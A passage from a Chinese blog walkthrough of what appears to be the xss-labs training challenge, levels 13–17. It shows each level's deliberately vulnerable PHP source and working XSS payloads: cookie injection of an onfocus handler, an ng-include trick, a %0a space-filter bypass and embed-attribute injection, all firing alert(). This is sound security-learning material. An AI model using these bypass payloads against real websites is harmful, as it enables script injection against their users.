 <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/level13.<span class="hljs-attr">php</span>:<span class="hljs-number">1</span>) in &lt;b&gt;/<span class="hljs-keyword">var</span>/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">16</span>&lt;/b&gt;&lt;br /&gt;<br>&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:<span class="hljs-number">0</span>&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br>```  <br>  <br>看样子是无法解析报头  <br><br>开源码看看：<br><br>```php<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>e，是cookie吗<br>那在cookie注入即可：  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /level13.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;129&quot;</span>, <span class="hljs-string">&quot;Not=A?Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: user=&#x27;%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onfocus%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>alert(<span class="hljs-number">1</span>)%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>type%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>这关加载了一个奇怪的图片？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>看看源码吧：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>???<br>查了一下，网站是一个exif查看器用来查看图片信息的  </p><p>那思考一下，竟然都是在我的前端上解析的，那我改host是不是能指向我想指向的ip？  </p><p>和ai探讨了一下，在比赛中一般是有bot来当做用户来访问触发我的xss，而我是不能修改他们的host的  </p><p>所以另一个方向是上传一张会返回xss的图片？  </p><p>问题是在我的环境上无法打开网站，提示：  </p><p>Please turn off your ad blocker.</p><p>要我关掉我的广告拦截器？  </p><p>关了edge的一个相关功能，还是打不开。  </p><p>上网找wp吧。参考<a href="https://www.freebuf.com/articles/web/282983.html">文章</a>  </p><p>网站会解析图片的exif信息，然后返回到前端，在图片的exif里插入xss即可完成攻击  </p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>查看源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只发现可src一个传入点，给ai看了一下，好像要有中间件绕过？  </p><p>上网看wp：  </p><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号  </p><p>竟然能直接包含第一关？  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br></code></pre></td></tr></table></figure><p>所以就是攻击包含的代码来达到攻击的效果吗？  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fff&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>通关<br>源wp是下面的payload：  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;</span><br><span class="language-xml">```  </span><br><span class="language-xml"></span><br><span class="language-xml">## level 16  </span><br><span class="language-xml"></span><br><span class="language-xml">依旧偷看源码：  </span><br><span class="language-xml">```php</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span></span><br><span class="language-javascript"><span class="language-xml">&#123;     </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);</span><br><span class="language-php"><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);</span><br><span class="language-php"><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);</span><br><span class="language-php"><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>这都过滤了啥？  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">script</span><br>空格<br>/  (可以用来代替空格)<br></code></pre></td></tr></table></figure><p>php的空格绕过是经典必考了，上网一查就有，<br>payload：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;fff&quot;</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure><h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>开题就显示插件不支持。。。。<br>前端html：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是看看源码吧：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level17&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>依旧看(wp)[<a href="https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]">https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]</a>  </p><p>大概是考了embad区域?   </p><p>选择了改一下源码。。。<br>变成了：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=indce.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>尝试了：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=onclick&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure><p>不行，注意到写法里的引号<br>然而正确的payload为：  </p><figure class="highlight 